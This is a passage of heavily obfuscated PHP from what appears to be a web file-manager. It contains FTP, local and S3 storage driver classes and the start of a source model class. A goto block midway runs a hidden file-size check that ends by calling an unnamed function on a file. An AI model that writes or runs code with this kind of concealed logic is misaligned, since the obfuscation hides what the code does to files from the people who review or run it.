$this->cacheMethodInfoSet($ëÜÅøøÂ, !0); } private function _listItem($ÙşĞøË) { if (empty($ÙşĞøË)) { return array(); } $œİÊ±¬Ş = preg_split($_SERVER[Ì¥ŞÒ°£][1390], $ÙşĞøË); if (count($œİÊ±¬Ş) <= 9) { return $œİÊ±¬Ş; } $œİÊ±¬Ş[8] = trim(substr($ÙşĞøË, strpos($ÙşĞøË, $œİÊ±¬Ş[7]) + strlen($œİÊ±¬Ş[7]))); return array_splice($œİÊ±¬Ş, 0, 9); } public function listPath($«íŠ±¾†, $«ŠÁ¥ä· = false) { $é·»ŒÙÄ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->_isconn()) { return !1; } $ÒŞ†¡ Ù = $ÄµšçÜ´ = array(); $this->fileList($«íŠ±¾†, $ÒŞ†¡ Ù, $ÄµšçÜ´); foreach ($ÒŞ†¡ Ù as $Âê‘§ˆ => $üÌŞİØ) { $ÒŞ†¡ Ù[$Âê‘§ˆ] = $this->folderInfo($üÌŞİØ, $«ŠÁ¥ä·); } foreach ($ÄµšçÜ´ as $Âê‘§ˆ => $üÌŞİØ) { $ÄµšçÜ´[$Âê‘§ˆ] = $this->fileInfo($üÌŞİØ[$é·»ŒÙÄ[32]], $«ŠÁ¥ä·, $üÌŞİØ); } return array($é·»ŒÙÄ[82] => $ÒŞ†¡ Ù, $é·»ŒÙÄ[83] => $ÄµšçÜ´); } public function has($ëÉâ’Ÿ·, $òàÁúÅÏ = false, $çóÈÁŠ„ = true) { $òéŠ»’Á =& $_SERVER[Ì¥ŞÒ°£]; $¦Éª¥û‘ = $‡àƒŒ¾ğ = array(); $Ÿõ…—ë = $òàÁúÅÏ ? !0 : !1; $this->fileList($ëÉâ’Ÿ·, $¦Éª¥û‘, $‡àƒŒ¾ğ, $Ÿõ…—ë); if ($òàÁúÅÏ) { return array($òéŠ»’Á[207] => count($‡àƒŒ¾ğ), $òéŠ»’Á[208] => count($¦Éª¥û‘)); } if ($çóÈÁŠ„) { if (count($‡àƒŒ¾ğ)) { return !0; } } else { if (count($¦Éª¥û‘)) { return !0; } } return !1; } public function listAll($§‘áÄÕÓ) { $Úâø÷íÁ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->_isconn()) { return !1; } $Çä§—ÚÏ = $ŞÉ‰àÇ© = array(); $this->fileList($§‘áÄÕÓ, $Çä§—ÚÏ, $ŞÉ‰àÇ©, !0); $¦»á÷÷ = array(); foreach ($ŞÉ‰àÇ© as $¬ùûš€‘) { $¦»á÷÷[$¬ùûš€‘[$Úâø÷íÁ[32]]] = $¬ùûš€‘[$Úâø÷íÁ[76]]; } foreach ($Çä§—ÚÏ as $¬ùûš€‘) { if (is_string($¬ùûš€‘)) { $¦»á÷÷[$¬ùûš€‘] = 0; } } return $this->listAllFiles($§‘áÄÕÓ, array_keys($¦»á÷÷), $¦»á÷÷); } public function getContent($èßê´‘) { if (!$this->_isconn()) { return !1; } $èßê´‘ = $this->iconvSystem($èßê´‘); return $this->fileSubstr($èßê´‘); } public function setContent($©¡¼€Ê, $£¸ºëàÂ = '') { if (!$this->_isconn()) { return !1; } $×Æ¢³‚ = $this->pathThis($this->iconvSystem($©¡¼€Ê)); $òº›ÛÁö = $this->tempFile($×Æ¢³‚); file_put_contents($òº›ÛÁö, $£¸ºëàÂ); $Óª„„ñ = $this->upload($©¡¼€Ê, $this->iconvApp($òº›ÛÁö)); $this->tempFileRemve($òº›ÛÁö); return $Óª„„ñ; } public function fileSubstr($ÚÒáğ°à, $ò–§£˜û = 0, $½½²°î² = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÚÒáğ°à, $ò–§£˜û, $½½²°î²); } private function ftpRequest($øêÒê­ô, $‰Ş¹öÈæ = 0, $‰¸ŠîÃ‘ = false) { $øêÒê­ô = $this->iconvSystem($øêÒê­ô); $Òìéì¢ = $this->scheme . $this->host . $_SERVER[Ì¥ŞÒ°£][4] . $this->port; $ÇøËéü÷ = curl_init(); curl_setopt($ÇøËéü÷, CURLOPT_URL, $Òìéì¢ . $this->pathEncode($øêÒê­ô)); curl_setopt($ÇøËéü÷, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($‰¸ŠîÃ‘) { $ğó‘ßŒ = $‰Ş¹öÈæ + $‰¸ŠîÃ‘ - 1; curl_setopt($ÇøËéü÷, CURLOPT_RANGE, "{$‰Ş¹öÈæ}\55{$ğó‘ßŒ}"); } curl_setopt($ÇøËéü÷, CURLOPT_RETURNTRANSFER, 1); $‰õ¾óÌÜ = curl_exec($ÇøËéü÷); curl_close($ÇøËéü÷); return $‰õ¾óÌÜ; } public function upload($€”»µİ, $ı¶€¡—Ô, $ù·´·òÚ = false, $æ˜ƒÜ¦ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($€”»µİ))) { return !1; } $€”»µİ = $this->iconvSystem($€”»µİ); $ı¶€¡—Ô = $this->iconvSystem($ı¶€¡—Ô); $‘ÈƒÍÓ = ftp_nb_put($this->connect, $€”»µİ, $ı¶€¡—Ô, FTP_BINARY); while ($‘ÈƒÍÓ == FTP_MOREDATA) { $‘ÈƒÍÓ = ftp_nb_continue($this->connect); } if ($‘ÈƒÍÓ != FTP_FINISHED) { return !1; } return $this->getPathOuter($€”»µİ); } public function download($â×ˆÕã¶, $¡ÏÆ§‘ = '') { if (!$this->_isconn()) { return !1; } $€åØ¬«Ã = $this->pathFather($¡ÏÆ§‘); if (!IO::mkdir($€åØ¬«Ã)) { return !1; } $â×ˆÕã¶ = $this->iconvSystem($â×ˆÕã¶); $¡ÏÆ§‘ = $this->iconvSystem($¡ÏÆ§‘); $ÈùõÜØ = ftp_nb_get($this->connect, $¡ÏÆ§‘, $â×ˆÕã¶, FTP_BINARY); while ($ÈùõÜØ == FTP_MOREDATA) { $ÈùõÜØ = ftp_nb_continue($this->connect); } if ($ÈùõÜØ != FTP_FINISHED) { return !1; } return $this->iconvApp($¡ÏÆ§‘); } public function exist($œÃŒ”Ä„) { return $this->isFile($œÃŒ”Ä„) || $this->isFolder($œÃŒ”Ä„); } public function isFile($¯é„²‹ô) { return !$this->isFolder($¯é„²‹ô) && $this->objectMeta($¯é„²‹ô); } public function isFolder($€‚«Ú¿…) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][165], $€‚«Ú¿…); } protected function objectMeta($íÂ®ëÔÍ) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][167], $íÂ®ëÔÍ); } protected function _objectMeta($äĞóÔèÚ) { $•°‡€Í¹ =& $_SERVER[Ì¥ŞÒ°£]; if ($äĞóÔèÚ == $•°‡€Í¹[12] || $äĞóÔèÚ == $•°‡€Í¹[8]) { return array(); } if (!$this->_isconn()) { return !1; } $äĞóÔèÚ = $this->iconvSystem($äĞóÔèÚ); $İæõş¶“ = array($•°‡€Í¹[32] => $this->iconvApp($äĞóÔèÚ), $•°‡€Í¹[33] => $•°‡€Í¹[199], $•°‡€Í¹[76] => 0); @ftp_chdir($this->connect, $•°‡€Í¹[8]); $ Ï’Ø¡ = @ftp_size($this->connect, $äĞóÔèÚ); if ($ Ï’Ø¡ != -1) { $İæõş¶“[$•°‡€Í¹[76]] = $ Ï’Ø¡; } else { $Èƒì›¡Ç = @ftp_chdir($this->connect, $äĞóÔèÚ); if (!$Èƒì›¡Ç) { return !1; } $İæõş¶“[$•°‡€Í¹[33]] = $•°‡€Í¹[75]; } return $İæõş¶“; } protected function _isFolder($ü±œÕÎÇ) { $†ø¾×ç =& $_SERVER[Ì¥ŞÒ°£]; if ($ü±œÕÎÇ == $†ø¾×ç[12] || $ü±œÕÎÇ == $†ø¾×ç[8]) { return !0; } $Á†ÂµÓ = $this->_objectMeta($ü±œÕÎÇ); return isset($Á†ÂµÓ[$†ø¾×ç[33]]) && $Á†ÂµÓ[$†ø¾×ç[33]] == $†ø¾×ç[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÊË™ùÊ×) { if (substr($ÊË™ùÊ×, 0, 2) == $_SERVER[Ì¥ŞÒ°£][1381]) { $ÊË™ùÊ× = BASIC_PATH . substr($ÊË™ùÊ×, 2); } return $ÊË™ùÊ×; } public function iconvApp($²şÃÊóÛ) { $„ÂÒùĞç =& $_SERVER[Ì¥ŞÒ°£]; global $config; return $this->iconvTo($²şÃÊóÛ, $config[$„ÂÒùĞç[1379]], $config[$„ÂÒùĞç[1378]]); } public function iconvSystem($²À¯Ü»¶) { $Å¥ÒšÜş =& $_SERVER[Ì¥ŞÒ°£]; global $config; return $this->iconvTo($²À¯Ü»¶, $config[$Å¥ÒšÜş[1378]], $config[$Å¥ÒšÜş[1379]]); } public function getPathOuter($€ûÄ¯Ğí) { $¸¥²Œ»ü =& $_SERVER[Ì¥ŞÒ°£]; $ª¡¢¥Óõ = $this->iconvApp($this->pathBase); $€ûÄ¯Ğí = $this->iconvApp($€ûÄ¯Ğí); if (substr($ª¡¢¥Óõ, 0, 2) == $¸¥²Œ»ü[1381]) { $ª¡¢¥Óõ = BASIC_PATH . substr($ª¡¢¥Óõ, 2); } if (substr($€ûÄ¯Ğí, 0, 2) == $¸¥²Œ»ü[1381]) { $€ûÄ¯Ğí = BASIC_PATH . substr($€ûÄ¯Ğí, 2); } $ª¡¢¥Óõ = KodIO::clear($ª¡¢¥Óõ); $€ûÄ¯Ğí = KodIO::clear($€ûÄ¯Ğí); $€ûÄ¯Ğí = substr($€ûÄ¯Ğí, strlen($ª¡¢¥Óõ)); if (empty($this->pathDriver)) { return $€ûÄ¯Ğí; } return $this->pathDriver . $¸¥²Œ»ü[8] . ltrim($€ûÄ¯Ğí, $¸¥²Œ»ü[8]); } public function mkfile($Ë…±”Éã, $½ŸÍ‰¤á = '', $É³˜Êâ¶ = REPEAT_RENAME) { $Ë…±”Éã = $this->iconvSystem($Ë…±”Éã); @touch($Ë…±”Éã); if ($½ŸÍ‰¤á) { file_put_contents($Ë…±”Éã, $½ŸÍ‰¤á); } @chmod($Ë…±”Éã, $this->pathAuth); return is_file($Ë…±”Éã) ? $this->getPathOuter($Ë…±”Éã) : !1; } public function mkdir($¤²÷ó¢›, $‡î‹˜Äª = REPEAT_SKIP) { $¤²÷ó¢› = $this->iconvSystem($¤²÷ó¢›); if (is_dir($¤²÷ó¢›)) { return $this->getPathOuter($¤²÷ó¢›); } @mkdir($¤²÷ó¢›, $this->pathAuth, !0); @chmod($¤²÷ó¢›, $this->pathAuth); return is_dir($¤²÷ó¢›) ? $this->getPathOuter($¤²÷ó¢›) : !1; } public function copyFile($ÊëõğÂÌ, $üëç”Å) { $this->mkdir($this->pathFather($üëç”Å)); $ÊëõğÂÌ = $this->iconvSystem($ÊëõğÂÌ); $üëç”Å = $this->iconvSystem($üëç”Å); $£ÇõîÎª = copy_64($ÊëõğÂÌ, $üëç”Å); @chmod($üëç”Å, $this->pathAuth); return $£ÇõîÎª ? $this->getPathOuter($üëç”Å) : !1; } public function moveFile($¯áâ­ÉË, $ËãŞŠÁ) { $this->mkdir($this->pathFather($ËãŞŠÁ)); $¯áâ­ÉË = $this->iconvSystem($¯áâ­ÉË); $ËãŞŠÁ = $this->iconvSystem($ËãŞŠÁ); $Èû‹ÜÃª = intval(@rename($¯áâ­ÉË, $ËãŞŠÁ)); if (!$Èû‹ÜÃª) { if ($Èû‹ÜÃª = intval(@copy_64($¯áâ­ÉË, $ËãŞŠÁ))) { @unlink($¯áâ­ÉË); } } @chmod($ËãŞŠÁ, $this->pathAuth); return $Èû‹ÜÃª ? $this->getPathOuter($ËãŞŠÁ) : !1; } public function movePath($“ûÃø›“, $ó¥ ÏÆ³, $ÑïÎˆ¤Ğ = false) { $œò‹˜­ğ =& $_SERVER[Ì¥ŞÒ°£]; $“ûÃø›“ = $this->iconvSystem($“ûÃø›“); $ó¥ ÏÆ³ = $this->iconvSystem($ó¥ ÏÆ³); $§Ûù×à = rtrim($ó¥ ÏÆ³, $œò‹˜­ğ[8]) . $œò‹˜­ğ[8] . ($ÑïÎˆ¤Ğ ? $ÑïÎˆ¤Ğ : get_path_this($“ûÃø›“)); if (file_exists($§Ûù×à)) { return !1; } $¹í€¿ƒ± = intval(@rename($“ûÃø›“, $§Ûù×à)); $¹í€¿ƒ± = file_exists($§Ûù×à); return $¹í€¿ƒ± ? $this->getPathOuter($§Ûù×à) : !1; } public function delFile($Ó®ú¦‡Œ) { $Ó®ú¦‡Œ = $this->iconvSystem($Ó®ú¦‡Œ); if (!@unlink($Ó®ú¦‡Œ)) { @chmod($Ó®ú¦‡Œ, $this->pathAuth); if (!@unlink($Ó®ú¦‡Œ)) { return !1; } } else { return !0; } } public function delFolder($Å©’Áí) { $·áæ´ğ =& $_SERVER[Ì¥ŞÒ°£]; $Å©’Áí = $this->iconvSystem($Å©’Áí); if (!is_dir($Å©’Áí)) { return !0; } if (!($áëÏ¿ö = opendir($Å©’Áí))) { return !1; } while (($çïŞÔñ = readdir($áëÏ¿ö)) !== !1) { if ($çïŞÔñ == $·áæ´ğ[10] || $çïŞÔñ == $·áæ´ğ[1388]) { continue; } $óÑ‚öÉ¢ = $Å©’Áí . $·áæ´ğ[8] . $çïŞÔñ; if (is_file($óÑ‚öÉ¢) || is_link($óÑ‚öÉ¢)) { if (!unlink($óÑ‚öÉ¢)) { chmod($óÑ‚öÉ¢, $this->pathAuth); if (!unlink($óÑ‚öÉ¢)) { return !1; } } } else { if (is_dir($óÑ‚öÉ¢)) { chmod($óÑ‚öÉ¢, $this->pathAuth); $óÑ‚öÉ¢ = $this->iconvApp($óÑ‚öÉ¢); if (!$this->delFolder($óÑ‚öÉ¢)) { return !1; } } } } closedir($áëÏ¿ö); return rmdir($Å©’Áí); } public function rename($ßÖ˜Áû…, $ê²Ãü´Ş) { $Ğ¤‡âí =& $_SERVER[Ì¥ŞÒ°£]; $É‹–± = $this->fileNameAuto($this->pathFather($ßÖ˜Áû…), $ê²Ãü´Ş); $É‹–± = $this->iconvSystem($É‹–±); $ßÖ˜Áû… = $this->iconvSystem($ßÖ˜Áû…); $îÜÓú½¯ = $this->pathFather($ßÖ˜Áû…); $¿ùğ„³ = rtrim($îÜÓú½¯, $Ğ¤‡âí[8]) . $Ğ¤‡âí[8] . $É‹–±; $‡›Æö• = @rename($ßÖ˜Áû…, $¿ùğ„³); $¿ùğ„³ = $this->iconvApp($¿ùğ„³); return $‡›Æö• ? $this->getPathOuter($¿ùğ„³) : !1; } public function size($‘ÊÆ’‚‡) { $‘ÊÆ’‚‡ = $this->iconvSystem($‘ÊÆ’‚‡); return filesize_64($‘ÊÆ’‚‡); } public function info($Óë³Òë¼) { $Óë³Òë¼ = $this->iconvSystem($Óë³Òë¼); if ($this->isFolder($Óë³Òë¼)) { return $this->folderInfo($Óë³Òë¼); } else { if ($this->isFile($Óë³Òë¼)) { return $this->fileInfo($Óë³Òë¼); } } return !1; } protected function infoChildren($À‡¦ıí°, &$ «€Êèé, $£Ìû‚÷á = true) { $ğÂ‡à¹š =& $_SERVER[Ì¥ŞÒ°£]; check_abort_echo(); $À‡¦ıí° = rtrim($À‡¦ıí°, $ğÂ‡à¹š[8]) . $ğÂ‡à¹š[8]; if ($£Ìû‚÷á) { $À‡¦ıí° = $this->iconvSystem($À‡¦ıí°); } if (!($ÒÈÛö‚ù = @opendir($À‡¦ıí°))) { return; } while (($›˜Ì÷™é = readdir($ÒÈÛö‚ù)) !== !1) { if ($›˜Ì÷™é == $ğÂ‡à¹š[10] || $›˜Ì÷™é == $ğÂ‡à¹š[1388]) { continue; } $•‰‘å…€ = $À‡¦ıí° . $›˜Ì÷™é; if (is_file($•‰‘å…€) || is_link($•‰‘å…€)) { $ «€Êèé[$ğÂ‡à¹š[77]]++; $ «€Êèé[$ğÂ‡à¹š[76]] += filesize_64($•‰‘å…€); } else { if (is_dir($•‰‘å…€)) { $ «€Êèé[$ğÂ‡à¹š[78]]++; $this->infoChildren($•‰‘å…€, $ «€Êèé, !1); } } } closedir($ÒÈÛö‚ù); } private function folderInfo($°è’éãŸ, $µæªôÒÌ = false) { $×‚˜å• =& $_SERVER[Ì¥ŞÒ°£]; $°è’éãŸ = rtrim($°è’éãŸ, $×‚˜å•[8]) . $×‚˜å•[8]; $ŸÙ„Ì¼¼ = $this->iconvApp($this->pathThis($°è’éãŸ)); if ($µæªôÒÌ) { return array($×‚˜å•[32] => $ŸÙ„Ì¼¼, $×‚˜å•[84] => $this->getPathOuter($°è’éãŸ), $×‚˜å•[33] => $×‚˜å•[75]); } $áõÛéÀ = array($×‚˜å•[32] => $ŸÙ„Ì¼¼, $×‚˜å•[84] => $this->getPathOuter($°è’éãŸ), $×‚˜å•[33] => $×‚˜å•[75], $×‚˜å•[200] => @filectime($°è’éãŸ), $×‚˜å•[85] => @filemtime($°è’éãŸ), $×‚˜å•[1391] => @fileatime($°è’éãŸ), $×‚˜å•[1392] => is_readable($°è’éãŸ), $×‚˜å•[1393] => is_writable($°è’éãŸ), $×‚˜å•[1394] => get_mode($°è’éãŸ)); return $áõÛéÀ; } private function fileInfo($á‰„Â³¦, $‰·Ùã« = false) { $ŞÍè´Öì =& $_SERVER[Ì¥ŞÒ°£]; $¼Ş“ÌèÂ = $this->iconvApp($this->pathThis($á‰„Â³¦)); if ($‰·Ùã«) { return array($ŞÍè´Öì[32] => $¼Ş“ÌèÂ, $ŞÍè´Öì[84] => $this->getPathOuter($á‰„Â³¦), $ŞÍè´Öì[33] => $ŞÍè´Öì[199], $ŞÍè´Öì[76] => $this->size($á‰„Â³¦), $ŞÍè´Öì[174] => $this->ext($¼Ş“ÌèÂ)); } $˜åÁ¼°ç = array($ŞÍè´Öì[32] => $¼Ş“ÌèÂ, $ŞÍè´Öì[84] => $this->getPathOuter($á‰„Â³¦), $ŞÍè´Öì[33] => $ŞÍè´Öì[199], $ŞÍè´Öì[200] => @filectime($á‰„Â³¦), $ŞÍè´Öì[85] => @filemtime($á‰„Â³¦), $ŞÍè´Öì[1391] => @fileatime($á‰„Â³¦), $ŞÍè´Öì[76] => $this->size($á‰„Â³¦), $ŞÍè´Öì[174] => $this->ext($¼Ş“ÌèÂ), $ŞÍè´Öì[1392] => is_readable($á‰„Â³¦), $ŞÍè´Öì[1393] => is_writable($á‰„Â³¦), $ŞÍè´Öì[1394] => get_mode($á‰„Â³¦)); return $˜åÁ¼°ç; } public function exist($‚åîİ©ó) { $‚åîİ©ó = $this->iconvSystem($‚åîİ©ó); return @file_exists($‚åîİ©ó); } public function isFile($‘Î”™Ì°) { $‘Î”™Ì° = $this->iconvSystem($‘Î”™Ì°); return @is_file($‘Î”™Ì°); } public function isFolder($ğ˜Ç³½ä) { $ğ˜Ç³½ä = $this->iconvSystem($ğ˜Ç³½ä); return @is_dir($ğ˜Ç³½ä); } public function listPath($è¹Æ¯ıò, $ÙŞªø¹ = false) { $¡Ïôê¥´ =& $_SERVER[Ì¥ŞÒ°£]; $è¹Æ¯ıò = $this->iconvSystem($è¹Æ¯ıò); $è¹Æ¯ıò = rtrim($è¹Æ¯ıò, $¡Ïôê¥´[8]) . $¡Ïôê¥´[8]; $õÒñúâ± = array($¡Ïôê¥´[82] => array(), $¡Ïôê¥´[83] => array()); if (!($ÅªáŸË = @opendir($è¹Æ¯ıò))) { return $õÒñúâ±; } while (($¦‚ˆ¶¨ô = readdir($ÅªáŸË)) !== !1) { if ($¦‚ˆ¶¨ô == $¡Ïôê¥´[10] || $¦‚ˆ¶¨ô == $¡Ïôê¥´[1388]) { continue; } $˜ÇôüØì = $è¹Æ¯ıò . $¦‚ˆ¶¨ô; if (is_file($˜ÇôüØì)) { $õÒñúâ±[$¡Ïôê¥´[83]][] = $this->fileInfo($˜ÇôüØì, $ÙŞªø¹); } else { $õÒñúâ±[$¡Ïôê¥´[82]][] = $this->folderInfo($˜ÇôüØì, $ÙŞªø¹); } } closedir($ÅªáŸË); return $õÒñúâ±; } public function listAll($¶ôÓ—ïË, &$Ñ¢ƒÄÎ® = array()) { $ºÅõ…ÀĞ =& $_SERVER[Ì¥ŞÒ°£]; $¶ôÓ—ïË = $this->iconvSystem($¶ôÓ—ïË); $¶ôÓ—ïË = rtrim($¶ôÓ—ïË, $ºÅõ…ÀĞ[8]) . $ºÅõ…ÀĞ[8]; if (!($Ã¬äÊËö = @opendir($¶ôÓ—ïË))) { return $Ñ¢ƒÄÎ®; } while (($µƒíãõ† = readdir($Ã¬äÊËö)) !== !1) { if ($µƒíãõ† == $ºÅõ…ÀĞ[10] || $µƒíãõ† == $ºÅõ…ÀĞ[1388]) { continue; } $èŠ¨Ğ€ñ = $¶ôÓ—ïË . $µƒíãõ†; if (is_dir($èŠ¨Ğ€ñ) && !is_link($èŠ¨Ğ€ñ)) { $Ñ¢ƒÄÎ®[] = array($ºÅõ…ÀĞ[84] => $èŠ¨Ğ€ñ . $ºÅõ…ÀĞ[8], $ºÅõ…ÀĞ[75] => 1, $ºÅõ…ÀĞ[85] => @filemtime($èŠ¨Ğ€ñ), $ºÅõ…ÀĞ[76] => 0); $this->listAll($èŠ¨Ğ€ñ, $Ñ¢ƒÄÎ®); } else { $Ñ¢ƒÄÎ®[] = array($ºÅõ…ÀĞ[84] => $èŠ¨Ğ€ñ, $ºÅõ…ÀĞ[75] => 0, $ºÅõ…ÀĞ[85] => @filemtime($èŠ¨Ğ€ñ), $ºÅõ…ÀĞ[76] => $this->size($èŠ¨Ğ€ñ)); } } closedir($Ã¬äÊËö); return $Ñ¢ƒÄÎ®; } public function has($Ë›·“öÊ, $¯ğ•ŞÓ´ = false, $‹ìÀ±ÈÏ = true) { $¾¢ÁÚØ =& $_SERVER[Ì¥ŞÒ°£]; $Ë›·“öÊ = $this->iconvSystem($Ë›·“öÊ); $Ë›·“öÊ = rtrim($Ë›·“öÊ, $¾¢ÁÚØ[8]) . $¾¢ÁÚØ[8]; if (!($áé§¼¿ë = @opendir($Ë›·“öÊ))) { return !1; } $—¨ø«İú = 0; $áïÛÈŠç = 0; $Î²úÇºø = 0; while (($±‡¥ùÈ = readdir($áé§¼¿ë)) !== !1) { if ($±‡¥ùÈ == $¾¢ÁÚØ[10] || $±‡¥ùÈ == $¾¢ÁÚØ[1388]) { continue; } $Å‡ªÅÑş = $Ë›·“öÊ . $±‡¥ùÈ; if ($¯ğ•ŞÓ´) { $Î²úÇºø++; if (@is_file($Å‡ªÅÑş)) { $—¨ø«İú++; } else { $áïÛÈŠç++; } if ($Î²úÇºø > 10000) { break; } continue; } if ($‹ìÀ±ÈÏ) { if (@is_file($Å‡ªÅÑş)) { return !0; } } else { if (@is_dir($Å‡ªÅÑş . $¾¢ÁÚØ[8])) { return !0; } } } closedir($áé§¼¿ë); if ($¯ğ•ŞÓ´) { return array($¾¢ÁÚØ[207] => $—¨ø«İú, $¾¢ÁÚØ[208] => $áïÛÈŠç); } return !1; } public function hashSimple($¥â³¡ÕÄ) { $ı°ÜÕáú =& $_SERVER[Ì¥ŞÒ°£]; if (!$¥â³¡ÕÄ) { return md5($ı°ÜÕáú[12]); } $¥â³¡ÕÄ = $this->iconvSystem($¥â³¡ÕÄ); $ò¢ûŒÉ› = $this->size($¥â³¡ÕÄ); $âÛÁŸµß = 200; $áè—»¸ª = 50; if ($ò¢ûŒÉ› <= $âÛÁŸµß * $áè—»¸ª) { return $this->hashMd5($¥â³¡ÕÄ) . $ò¢ûŒÉ›; } $¿¢úùÂó = $ı°ÜÕáú[12]; $¦¼ÅğÂ¨ = intval($ò¢ûŒÉ› / $áè—»¸ª); $ù˜‚ŞÀó = fopen($¥â³¡ÕÄ, $ı°ÜÕáú[1395]); if (!$ù˜‚ŞÀó) { return $¿¢úùÂó; } for ($£½ÆĞÈÓ = 0; $£½ÆĞÈÓ < $áè—»¸ª; $£½ÆĞÈÓ++) { fseek_64($ù˜‚ŞÀó, $¦¼ÅğÂ¨ * $£½ÆĞÈÓ); $¿¢úùÂó .= fread($ù˜‚ŞÀó, $âÛÁŸµß); } fseek_64($ù˜‚ŞÀó, $ò¢ûŒÉ› - $âÛÁŸµß); $¿¢úùÂó .= fread($ù˜‚ŞÀó, $âÛÁŸµß); fclose($ù˜‚ŞÀó); return md5($¿¢úùÂó) . $ò¢ûŒÉ›; } public function getContent($ËÏÆåÌ) { $ËÏÆåÌ = $this->iconvSystem($ËÏÆåÌ); return file_get_contents($ËÏÆåÌ); } public function setContent($¿ÙïÁÀ‡, $Ã§ÂØ§Ä = '') { $¿ÙïÁÀ‡ = $this->iconvSystem($¿ÙïÁÀ‡); $ÑÅ°ß¬é = @file_put_contents($¿ÙïÁÀ‡, $Ã§ÂØ§Ä, LOCK_EX); clearstatcache(); @chmod($¿ÙïÁÀ‡, $this->pathAuth); return $ÑÅ°ß¬é === !1 ? !1 : !0; } public function fileSubstr($›ãæ³®ƒ, $¥½Ğ¨ÙÖ = 0, $ò‘şÑô = false) { $Ù£¸Ä±Å =& $_SERVER[Ì¥ŞÒ°£]; $›ãæ³®ƒ = $this->iconvSystem($›ãæ³®ƒ); if ($ò‘şÑô === !1) { $ò‘şÑô = $this->size($›ãæ³®ƒ); } if ($ò‘şÑô <= 0) { return $Ù£¸Ä±Å[12]; } $›™™Å™Ì = fopen($›ãæ³®ƒ, $Ù£¸Ä±Å[1395]); if (!$›™™Å™Ì) { return !1; } fseek_64($›™™Å™Ì, $¥½Ğ¨ÙÖ); $Ê—§˜Ë† = fread($›™™Å™Ì, $ò‘şÑô); fclose($›™™Å™Ì); return $Ê—§˜Ë†; } public function upload($ŞÅµ·‚í, $ØÚÈíèÎ, $÷‡Íà = false, $•¹É¦Ä = REPEAT_REPLACE) { if ($÷‡Íà) { return $this->moveFile($ØÚÈíèÎ, $ŞÅµ·‚í); } return $this->copyFile($ØÚÈíèÎ, $ŞÅµ·‚í); } public function setModifyTime($ŸÄ˜ÂŒÇ, $¿ò××›³ = '') { @touch($ŸÄ˜ÂŒÇ, intval($¿ò××›³)); } public function download($±Ï—°´, $ÀÍ Ú¥œ) { return $this->iconvSystem($±Ï—°´); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Öƒ² ÷) { parent::__construct($Öƒ² ÷); $this->signatureVersion($_SERVER[Ì¥ŞÒ°£][216]); } public function fileOutLink($÷®œ¹—´) { $‘¶‡ Ôê =& $_SERVER[Ì¥ŞÒ°£]; if (substr($÷®œ¹—´, 0, 7) == $‘¶‡ Ôê[1339]) { $÷®œ¹—´ = $‘¶‡ Ôê[1340] . substr($÷®œ¹—´, 7); } header($‘¶‡ Ôê[161] . $÷®œ¹—´); die; } } goto CÓ¨âå’¡Š; aìŠíÖö±ğ: $_size = $_SERVER[Ì¥ŞÒ°£][876]; if ($_SERVER[$_SERVER[Ì¥ŞÒ°£][877]] != $_size($_file)) { $_getc = $_SERVER[Ì¥ŞÒ°£][879]; $_getfile = $_SERVER[$_SERVER[Ì¥ŞÒ°£][874]] . $_SERVER[Ì¥ŞÒ°£][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ì¥ŞÒ°£][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ì¥ŞÒ°£][615]) { $exit = $_SERVER[Ì¥ŞÒ°£][880]; $exit(); } $_act = $_SERVER[Ì¥ŞÒ°£][916]; $_act($_file); } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($à‘¶ìıİ) { $»—Å®Æ¹ =& $_SERVER[Ì¥ŞÒ°£]; $üŒı¬×ñ = Model($»—Å®Æ¹[513])->where(array($»—Å®Æ¹[1658] => $à‘¶ìıİ))->find(); $ƒøçœÇ = $this->_mkdirRoot(SourceModel::TYPE_USER, $à‘¶ìıİ, $üŒı¬×ñ[$»—Å®Æ¹[32]]); $this->userDesktopAdd($ƒøçœÇ); return $ƒøçœÇ; } public function userDesktopAdd($šüØÈ€ú) { $Æâ¶©€Ö =& $_SERVER[Ì¥ŞÒ°£]; $«ìÃÙ×Ø = LNG($Æâ¶©€Ö[2125]); $Ì¿ï•‡ = $this->mkdir($šüØÈ€ú, $«ìÃÙ×Ø); $this->metaSet($Ì¿ï•‡, $Æâ¶©€Ö[2126], $Æâ¶©€Ö[88]); $this->metaSet($šüØÈ€ú, $Æâ¶©€Ö[2127], $Ì¿ï•‡); } public function userPathSafeAdd($ôŸøçÇ ) { $˜‡ãô¡ =& $_SERVER[Ì¥ŞÒ°£]; $ù€ÁÂ‡” = Model($˜‡ãô¡[513])->getInfoFull($ôŸøçÇ ); if (!$ù€ÁÂ‡”) { return !1; } if (_get($ù€ÁÂ‡”, $˜‡ãô¡[536])) { return $ù€ÁÂ‡”[$˜‡ãô¡[466]][$˜‡ãô¡[2128]]; } $‘‚œ…À¨ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ôŸøçÇ , $˜‡ãô¡[2129], $˜‡ãô¡[433]); Model($˜‡ãô¡[513])->metaSet($ôŸøçÇ , $˜‡ãô¡[2128], $‘‚œ…À¨); $this->metaSet($‘‚œ…À¨, $˜‡ãô¡[2130], $ôŸøçÇ ); return $‘‚œ…À¨; } public function groupRootAdd($íßÖÅö•) { $€ôã†ŞÂ =& $_SERVER[Ì¥ŞÒ°£]; $Ùô´û‘  = Model($€ôã†ŞÂ[522])->where(array($€ôã†ŞÂ[1945] => $íßÖÅö•))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $íßÖÅö•, $Ùô´û‘ [$€ôã†ŞÂ[32]]); } public function systemRootPathAdd($¥©Š¥Õª) { if ($¥©Š¥Õª != $_SERVER[Ì¥ŞÒ°£][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¥©Š¥Õª); } public function 